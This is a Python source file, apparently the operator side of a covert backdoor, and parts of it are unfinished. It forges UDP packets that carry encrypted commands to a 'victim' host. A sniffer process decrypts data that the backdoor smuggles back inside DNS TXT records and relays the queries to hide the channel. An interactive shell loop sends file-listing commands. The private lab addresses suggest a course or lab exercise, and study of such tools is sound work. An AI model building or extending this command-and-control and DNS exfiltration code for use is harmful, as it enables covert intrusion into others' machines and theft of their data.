# This will contain the code for sending packets and receiving responses to the backdoor.

from shell import *
from scapy.all import IP, sr1, UDP, send, sniff, Raw
from encryption import *
from multiprocessing import Process, SimpleQueue

queue = SimpleQueue()

# Initialize the encryption context.
encryption_handler = StreamEncryption()
encryption_handler.read_nonce("nonce.bin")
encryption_handler.read_secret("secret.key")
encryption_handler.initialize_encryption_context()

def subprocess_packet_handler(pkt):
    if pkt[UDP].sport != 53 or pkt[UDP].dport != 53:
        return None
    # 1. Decrypt the data in the TXT record.
    print(pkt.show())
    encrypted_message = pkt[UDP].an.rdata[0]
    message = encryption_handler.decrypt(encrypted_message)
    print(f"Received: {message.decode('utf-8')}")
    # 2. Put the data in the queue.

    # 3. Remove the TXT record from the pkt.

    # 4. sr1 the DNS query to a legit DNS server.

    # 5. send the response back to the backdoor machine.

    # 6. Finish.

def subprocess_start():
    sniff(filter="ip src host 10.0.0.131 and not port ssh and udp and not icmp", iface="enp2s0", prn=subprocess_packet_handler)


def send_udp(victim_ip: str, data: str):
    """
        Sends a UDP packet to the backdoor which is supposed to contain a command. 
        All commands get sent to a specific UDP port on the backdoor machine. 
        The UDP packet that is sent contains the encrypted command in the payload 
        section. The backdoor machine listens for a specific port to know that 
        the UDP packet is ours.
    """
    # Encrypt the data.
    encrypted_data = encryption_handler.encrypt(data.encode('utf-8'))
    # Forge the UDP packet.
    pkt = IP(src="10.0.0.159", dst=victim_ip)/UDP(sport=10069, dport=10420, len=len(encrypted_data))
    pkt[UDP].payload = Raw(encrypted_data)
    print(Raw(encrypted_data))
    print(encrypted_data)
    # Send the packet.
    send(pkt)


if __name__ == "__main__":


    # Start the secondary process which sniffs for DNS requests from the backdoor,
    # decodes the attached information, and forwards the DNS request to a legitimate server,
    # then forwards the legitmate response back to the backdoor.
    decode_process = Process(target=subprocess_start)
    decode_process.start()

    # Main shell loop
    print_menu()
    while True:
        try:
            command = input("λ: ")
        except KeyboardInterrupt:
            break
        args = command.split(" ")
        arg_count = len(args)
        if arg_count == 1:
            if command == HELP:
                print_help()
            elif command == CLEAR:
                clear_screen()
            elif command == EXIT:
                break
        if arg_count == 2:
            if args[0] == LIST:
                file_path = args[1]
                data = args[0] + " " + args[1]
                # Send the command to backdoor.
                send_udp("10.0.0.131", data)
                # Receive the response.

                # Now we need a way of checking for the response.
                # Each response will be packaged as follows:
                # responseID data
                pass
    decode_process.kill()
